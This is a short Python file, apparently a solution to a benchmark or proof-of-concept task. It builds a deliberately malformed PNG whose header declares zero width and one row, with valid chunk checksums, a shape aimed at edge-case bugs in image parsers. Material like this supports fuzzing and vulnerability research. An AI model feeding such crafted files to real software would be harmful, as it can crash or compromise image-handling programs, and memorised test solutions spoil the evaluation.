import struct
import binascii
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def png_chunk(chunk_type: bytes, data: bytes) -> bytes:
            length = struct.pack(">I", len(data))
            crc = struct.pack(">I", binascii.crc32(chunk_type + data) & 0xffffffff)
            return length + chunk_type + data + crc

        # PNG signature
        png_sig = b"\x89PNG\r\n\x1a\n"

        # IHDR with zero width, non-zero height
        width = 0
        height = 1
        bit_depth = 8
        color_type = 0  # Grayscale
        compression = 0
        filter_method = 0
        interlace = 0

        ihdr_data = struct.pack(">IIBBBBB",
                                width, height, bit_depth, color_type,
                                compression, filter_method, interlace)
        ihdr = png_chunk(b'IHDR', ihdr_data)

        # IDAT: for width=0, each row has only 1 filter byte
        # Provide height rows worth of filter bytes (all 0)
        raw_scanlines = b"\x00" * height
        idat_data = zlib.compress(raw_scanlines)
        idat = png_chunk(b'IDAT', idat_data)

        # IEND
        iend = png_chunk(b'IEND', b'')

        return png_sig + ihdr + idat + iend
